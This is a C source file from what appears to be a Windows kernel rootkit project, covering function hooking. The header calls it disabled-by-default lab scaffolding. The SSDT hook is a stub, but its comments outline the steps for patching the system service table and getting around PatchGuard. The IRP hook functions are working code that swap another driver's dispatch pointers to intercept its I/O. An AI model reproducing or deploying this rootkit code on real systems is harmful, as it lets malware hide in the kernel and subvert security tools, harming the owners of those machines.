/*==============================================================================
 * rootkit/src/hook.c
 *------------------------------------------------------------------------------
 * Hook Scaffolding (DISABLED BY DEFAULT).
 *
 * WARNING: Modern PatchGuard (KPP) on Windows 11 (22621+) will BSOD the
 * machine if any of these hooks are active without additional countermeasures
 * (hypervisor-based KPP bypass, test signing with VBS disabled, etc.).
 *
 * This file is provided as scaffolding for lab/test environments only.
 *============================================================================*/
#include "utils.h"

/*==============================================================================
 * SSDT HOOK SCAFFOLDING (NOT IMPLEMENTED)
 *------------------------------------------------------------------------------
 * There is no reliable way to hook SSDT on 22621+ that survives KPP without
 * a separate hypervisor component. The code below shows the intended shape;
 * enabling it requires:
 *   1. Resolving nt!KiServiceTable via signature scan (relative offsets)
 *   2. Disabling CR0.WP around the write
 *   3. Handling KPP's periodic integrity checks
 *============================================================================*/
typedef struct _SSDT_ENTRY {
    ULONG   service_index;
    PVOID   original;
    PVOID   replacement;
} SSDT_ENTRY;

static SSDT_ENTRY g_ssdt_hooks[8];
static ULONG      g_ssdt_hook_count = 0;

NTSTATUS hook_ssdt_install(ULONG service_index, PVOID replacement) {
    if (g_ssdt_hook_count >= ARRAYSIZE(g_ssdt_hooks)) return STATUS_INSUFFICIENT_RESOURCES;

    /* RESOLUTION NOT IMPLEMENTED:
     * On 22621+, KiServiceTable stores relative int32 offsets, not absolute
     * addresses. The canonical resolver:
     *   1. Locate KeServiceDescriptorTable (exported on 19041 and older)
     *   2. On newer builds, scan ntoskrnl for the pattern of 4-byte aligned
     *      int32 offsets following a known signature.
     * See hypervisor path for KPP-safe approach.
     */
    UNREFERENCED_PARAMETER(service_index);
    UNREFERENCED_PARAMETER(replacement);
    return STATUS_NOT_IMPLEMENTED;
}

VOID hook_ssdt_remove_all(VOID) {
    g_ssdt_hook_count = 0;
    RtlZeroMemory(g_ssdt_hooks, sizeof(g_ssdt_hooks));
}

/*==============================================================================
 * IRP HOOK SCAFFOLDING (DISABLED)
 *------------------------------------------------------------------------------
 * Replaces DriverObject->MajorFunction entries of a target driver.
 * Disabled by default - use only in controlled environments.
 *============================================================================*/
NTSTATUS hook_irp_install(PDRIVER_OBJECT target, UCHAR major, PDRIVER_DISPATCH replacement, PDRIVER_DISPATCH* out_original) {
    if (major > IRP_MJ_MAXIMUM_FUNCTION) return STATUS_INVALID_PARAMETER;
    *out_original = target->MajorFunction[major];
    InterlockedExchangePointer((PVOID*)&target->MajorFunction[major], replacement);
    return STATUS_SUCCESS;
}

VOID hook_irp_restore(PDRIVER_OBJECT target, UCHAR major, PDRIVER_DISPATCH original) {
    if (major <= IRP_MJ_MAXIMUM_FUNCTION) {
        InterlockedExchangePointer((PVOID*)&target->MajorFunction[major], original);
    }
}